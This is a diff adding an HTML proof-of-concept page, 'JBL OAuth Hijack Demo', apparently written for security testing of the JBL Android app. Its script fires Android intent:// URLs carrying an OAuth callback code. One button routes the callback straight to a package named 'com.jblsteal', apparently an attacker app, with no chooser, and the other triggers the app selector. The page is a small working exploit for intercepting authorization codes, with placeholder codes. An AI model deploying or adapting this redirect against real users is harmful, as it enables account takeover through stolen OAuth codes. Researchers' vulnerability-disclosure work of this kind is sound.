@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JBL OAuth Hijack Demo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 100%;
+            margin: 0 auto; 
+            padding: 15px;
+            line-height: 1.5;
+            background: white;
+            color: #333;
+        }
+        .header {
+            background: linear-gradient(135deg, #0066cc 0%, #004499 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            text-align: center;
+            color: white;
+        }
+        .jbl-logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 30px 0;
+            align-items: center;
+            width: 100%;
+        }
+        button {
+            width: 90%;
+            max-width: 300px;
+            padding: 18px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+        .auto-btn {
+            background: #ff4444;
+            color: white;
+        }
+        .chooser-btn {
+            background: #ffaa00;
+            color: white;
+        }
+        .info-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 25px;
+            font-size: 14px;
+            border: 1px solid #e9ecef;
+            text-align: center;
+        }
+        @media (min-width: 768px) {
+            .button-container {
+                flex-direction: row;
+                justify-content: center;
+            }
+            button {
+                width: 45%;
+                max-width: 250px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="jbl-logo">JBL</div>
+        <h1>OAuth Security Demo</h1>
+        <p>Testing authentication flow scenarios</p>
+    </div>
+
+    <div class="button-container">
+        <button class="auto-btn" onclick="triggerAutoHijack()">
+            Test Auto-Hijack<br>
+            <small>(No chooser appears)</small>
+        </button>
+        
+        <button class="chooser-btn" onclick="triggerAppSelector()">
+            Test App Selector<br>
+            <small>(Shows app selection)</small>
+        </button>
+    </div>
+
+    <div class="info-box">
+        <strong>What to expect:</strong><br>
+        • <strong>Auto-Hijack:</strong> Directly opens the authentication handler<br>
+        • <strong>App Selector:</strong> Shows app selection dialog<br>
+        • Both scenarios test JBL authentication security
+    </div>
+
+    <script>
+        function triggerAutoHijack() {
+            // Forces direct opening - no chooser
+            const url = "intent://callback?code=auto_hijack_" + 
+                Math.random().toString(36).substr(2, 8) + 
+                "#Intent;scheme=com.jbl.oneapp;package=com.jblsteal;end";
+            
+            window.location = url;
+        }
+
+        function triggerAppSelector() {
+            // Shows app chooser
+            const url = "intent://callback?code=app_selector_" + 
+                Math.random().toString(36).substr(2, 8) + 
+                "#Intent;scheme=com.jbl.oneapp;end";
+            
+            window.location = url;
+        }
+    </script>
+</body>
+</html>
